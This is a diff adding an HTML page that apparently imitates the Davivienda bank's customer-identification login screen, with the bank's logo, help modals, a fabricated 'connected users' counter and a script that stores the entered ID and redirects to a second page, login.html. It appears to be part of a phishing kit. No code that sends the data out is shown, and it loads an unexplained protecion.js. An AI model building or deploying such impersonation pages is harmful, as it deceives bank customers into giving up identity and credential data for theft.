@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="pageTitle">Identificación del cliente - Davivienda</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <!-- Aquí va tu archivo CSS externo -->
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+            <img src="Davivienda-Logo-Vector.svg-.png" alt="Davivienda Logo" class="logo-img">
+            </div>
+            <div class="header-right">
+                <div class="language-selector" onclick="toggleLanguage()">
+                    <i class="fas fa-globe"></i>
+                    <span id="currentLang">English</span>
+                </div>
+                <div class="user-info">
+                    <i class="fas fa-users"></i>
+                    <span id="connectedUsersText">Usuarios conectados:</span>
+                    <strong id="userCount">4,362</strong>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="main-container">
+        <div class="login-card">
+            <h1 class="titulo-seccion" id="mainTitle">
+                Identificación del cliente
+            </h1>
+            
+            <div class="contenedor-formulario-ingreso">
+                <form id="loginForm">
+                    <div class="form-group">
+                        <div class="input-wrapper">
+                            <input 
+                                type="text" 
+                                id="identification" 
+                                class="form-input" 
+                                placeholder="identificación"
+                                required
+                            >
+                            <i class="fas fa-info-circle info-icon"></i>
+                            <div class="tooltip" id="tooltip">Información adicional sobre el campo</div>
+                        </div>
+                    </div>
+
+                    <div class="digital-signature">
+                        <input type="checkbox" id="digitalSignatureCheck">
+                        <label for="digitalSignatureCheck" id="digitalSigText">Firma digital</label>
+                    </div>
+
+                    <button type="submit" class="boton-primario" id="loginBtn">
+                        <span id="loginBtnText">Ingresar</span>
+                    </button>
+                </form>
+            </div>
+
+            <div class="options">
+                <a href="#" class="boton-link" onclick="showModal('autoadhesion')" id="autoRegistration">
+                   AutoAdhesión
+                </a>
+                <a href="#" class="boton-link" onclick="showModal('forgot')" id="forgotPassword">
+                   ¿Olvidó su clave?
+                </a>
+                <a href="#" class="boton-link" onclick="showModal('blocked')" id="blockedUser">
+                   Mi usuario fue bloqueado
+                </a>
+                <a href="#" class="boton-link" onclick="showModal('firstTime')" id="firstTimeSignature">
+                   Usar firma digital por primera vez
+                </a>
+            </div>
+
+            <div class="security-info">
+                <strong>Davivienda</strong> 
+                <span id="securityText">
+                    tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo
+                </span>
+                <a href="#" class="security-link" id="securityLink" onclick="showSecurityInfo()">click aquí</a>.
+            </div>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>
+            <strong>Davivienda</strong> - © 2024 Davivienda - 
+            <span id="rightsText">
+                Todos los derechos reservados
+            </span>
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div id="modal" class="modal" onclick="closeModal(event)">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title" id="modalTitle">Información</h3>
+                <button class="close-btn" onclick="closeModal()">&times;</button>
+            </div>
+            <div id="modalBody">
+                <p>Contenido del modal</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Contenedor de notificaciones -->
+    <div id="notificationContainer"></div>
+
+ <script>
+  document.getElementById('loginForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+
+    // Guardar en localStorage el dato del primer formulario
+    const name = document.getElementById('identification').value.trim();
+    localStorage.setItem('name', name);
+
+    // Redirigir a la segunda página
+    window.location.href = "login.html";
+  });
+</script>
+
+    <script>
+        let currentLanguage = 'es';
+        let userCount = 4362;
+
+        // Traducciones
+        const translations = {
+            es: {
+                pageTitle: "Identificación del cliente - Davivienda",
+                mainTitle: "Identificación del cliente",
+                idLabel: "Identificación",
+                placeholder: "Ingrese su número de identificación",
+                digitalSig: "Firma digital",
+                loginBtn: "Ingresar",
+                autoRegistration: "AutoAdhesión",
+                forgotPassword: "¿Olvidó su clave?",
+                blockedUser: "Mi usuario fue bloqueado",
+                firstTimeSignature: "Usar firma digital por primera vez",
+                securityText: "tiene el compromiso de proteger su privacidad y la integridad de su información personal y financiera. A continuación se definen recomendaciones para su seguridad. Consúltelas haciendo",
+                securityLink: "click aquí",
+                rightsText: "Todos los derechos reservados",
+                connectedUsers: "Usuarios conectados:",
+                tooltip: "Información adicional sobre el campo",
+                currentLang: "English"
+            },
+            en: {
+                pageTitle: "Customer Identification - Davivienda",
+                mainTitle: "Customer Identification",
+                idLabel: "Identification",
+                placeholder: "Enter your identification number",
+                digitalSig: "Digital signature",
+                loginBtn: "Login",
+                autoRegistration: "Self-Registration",
+                forgotPassword: "Forgot your password?",
+                blockedUser: "My user was blocked",
+                firstTimeSignature: "Use digital signature for the first time",
+                securityText: "is committed to protecting your privacy and the integrity of your personal and financial information. Below are security recommendations. Check them by clicking",
+                securityLink: "click here",
+                rightsText: "All rights reserved",
+                connectedUsers: "Connected users:",
+                tooltip: "Additional field information",
+                currentLang: "Español"
+            }
+        };
+
+        function toggleLanguage() {
+            currentLanguage = currentLanguage === 'es' ? 'en' : 'es';
+            updateLanguage();
+        }
+
+        function updateLanguage() {
+            const t = translations[currentLanguage];
+            
+            document.getElementById('pageTitle').textContent = t.pageTitle;
+            document.getElementById('mainTitle').textContent = t.mainTitle;
+            document.getElementById('idLabel').textContent = t.idLabel;
+            document.getElementById('identification').placeholder = t.placeholder;
+            document.getElementById('digitalSigText').textContent = t.digitalSig;
+            document.getElementById('loginBtnText').textContent = t.loginBtn;
+            document.getElementById('autoRegistration').textContent = t.autoRegistration;
+            document.getElementById('forgotPassword').textContent = t.forgotPassword;
+            document.getElementById('blockedUser').textContent = t.blockedUser;
+            document.getElementById('firstTimeSignature').textContent = t.firstTimeSignature;
+            document.getElementById('securityText').textContent = t.securityText;
+            document.getElementById('securityLink').textContent = t.securityLink;
+            document.getElementById('rightsText').textContent = t.rightsText;
+            document.getElementById('connectedUsersText').textContent = t.connectedUsers;
+            document.getElementById('tooltip').textContent = t.tooltip;
+            document.getElementById('currentLang').textContent = t.currentLang;
+        }
+
+        function showModal(type) {
+            const modal = document.getElementById('modal');
+            const modalTitle = document.getElementById('modalTitle');
+            const modalBody = document.getElementById('modalBody');
+            
+            const modalContent = {
+                autoadhesion: {
+                    title: currentLanguage === 'es' ? 'AutoAdhesión' : 'Self-Registration',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Para registrarse automáticamente, complete el formulario de registro en línea.</p><p>Necesitará tener a mano su documento de identificación y correo electrónico.</p>' : 
+                        '<p>To self-register, complete the online registration form.</p><p>You will need your identification document and email address.</p>'
+                },
+                forgot: {
+                    title: currentLanguage === 'es' ? 'Recuperar Clave' : 'Password Recovery',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Puede recuperar su clave a través de su correo electrónico registrado.</p><p>Se enviará un enlace de recuperación a su email.</p>' : 
+                        '<p>You can recover your password through your registered email.</p><p>A recovery link will be sent to your email.</p>'
+                },
+                blocked: {
+                    title: currentLanguage === 'es' ? 'Usuario Bloqueado' : 'Blocked User',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Su usuario ha sido bloqueado por seguridad.</p><p>Contacte a nuestro servicio al cliente para desbloquearlo.</p><p><strong>Teléfono:</strong> 2287-8888</p>' : 
+                        '<p>Your user has been blocked for security reasons.</p><p>Contact our customer service to unlock it.</p><p><strong>Phone:</strong> 2287-8888</p>'
+                },
+                firstTime: {
+                    title: currentLanguage === 'es' ? 'Primera Vez con Firma Digital' : 'First Time Digital Signature',
+                    body: currentLanguage === 'es' ? 
+                        '<p>Para usar la firma digital por primera vez:</p><ol><li>Descargue el certificado digital</li><li>Siga las instrucciones de instalación</li><li>Active su firma digital</li></ol>' : 
+                        '<p>To use digital signature for the first time:</p><ol><li>Download the digital certificate</li><li>Follow the installation instructions</li><li>Activate your digital signature</li></ol>'
+                }
+            };
+            
+            const content = modalContent[type];
+            modalTitle.textContent = content.title;
+            modalBody.innerHTML = content.body;
+            
+            modal.style.display = 'block';
+        }
+
+        function closeModal(event) {
+            const modal = document.getElementById('modal');
+            if (event && event.target !== modal) return;
+            modal.style.display = 'none';
+        }
+
+        function showNotification(message, type = 'success') {
+            const container = document.getElementById('notificationContainer');
+            const notification = document.createElement('div');
+            notification.className = `notification ${type}`;
+            notification.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 0.5rem;">
+                    <i class="fas ${type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}"></i>
+                    <span>${message}</span>
+                </div>
+            `;
+            
+            container.appendChild(notification);
+            
+            setTimeout(() => notification.classList.add('show'), 100);
+            setTimeout(() => {
+                notification.classList.remove('show');
+                setTimeout(() => {
+                    if (container.contains(notification)) {
+                        container.removeChild(notification);
+                    }
+                }, 400);
+            }, 3000);
+        }
+
+        function showSecurityInfo() {
+            const message = currentLanguage === 'es' ? 
+                'Las recomendaciones de seguridad se abrirán en una nueva ventana.' : 
+                'Security recommendations will open in a new window.';
+            showNotification(message);
+        }
+
+        // Manejo del formulario
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const identification = document.getElementById('identification').value.trim();
+            const loginBtn = document.getElementById('loginBtn');
+            
+            if (!identification) {
+                const message = currentLanguage === 'es' ? 
+                    'Por favor ingrese su número de identificación' : 
+                    'Please enter your identification number';
+                showNotification(message, 'error');
+                return;
+            }
+
+            if (identification.length < 8) {
+                const message = currentLanguage === 'es' ? 
+                    'El número de identificación debe tener al menos 8 dígitos' : 
+                    'Identification number must have at least 8 digits';
+                showNotification(message, 'error');
+                return;
+            }
+
+            // Estado de loading
+            loginBtn.classList.add('loading');
+            loginBtn.disabled = true;
+            
+            setTimeout(() => {
+                loginBtn.classList.remove('loading');
+                loginBtn.disabled = false;
+                
+                const message = currentLanguage === 'es' ? 
+                    'Identificación procesada correctamente. Redirigiendo...' : 
+                    'Identification processed successfully. Redirecting...';
+                showNotification(message);
+                
+                // Simular redirección
+                setTimeout(() => {
+                    const redirectMsg = currentLanguage === 'es' ? 
+                        'Bienvenido al sistema bancario' : 
+                        'Welcome to the banking system';
+                    showNotification(redirectMsg);
+                }, 1500);
+            }, 2000);
+        });
+
+        // Cerrar modal con Escape
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeModal();
+            }
+        });
+
+        // Animar contador de usuarios
+        function animateUserCount() {
+            const increment = Math.random() > 0.5 ? 1 : -1;
+            userCount += increment;
+            if (userCount < 4300) userCount = 4300;
+            if (userCount > 4500) userCount = 4500;
+            
+            document.getElementById('userCount').textContent = userCount.toLocaleString();
+            
+            if (increment > 0) {
+                document.getElementById('userCount').classList.add('pulse');
+                setTimeout(() => {
+                    document.getElementById('userCount').classList.remove('pulse');
+                }, 1000);
+            }
+        }
+
+        // Validación en tiempo real
+        document.getElementById('identification').addEventListener('input', function(e) {
+            const value = e.target.value;
+            const isValid = value.length >= 8 && /^\d+$/.test(value);
+            
+            if (value.length > 0 && !isValid) {
+                e.target.style.borderBottomColor = '#e74c3c';
+            } else {
+                e.target.style.borderBottomColor = '#EE1C25';
+            }
+        });
+
+        // Inicialización
+        document.addEventListener('DOMContentLoaded', function() {
+            updateLanguage();
+            
+            // Animar contador cada 15 segundos
+            setInterval(animateUserCount, 15000);
+            
+            // Simular llegada de nuevos usuarios
+            setTimeout(() => {
+                const message = currentLanguage === 'es' ? 
+                    'Nuevo usuario conectado al sistema' : 
+                    'New user connected to the system';
+                showNotification(message);
+                animateUserCount();
+            }, 5000);
+        });
+    </script>
+   <script src="protecion.js"></script>
+</body>
+</html>
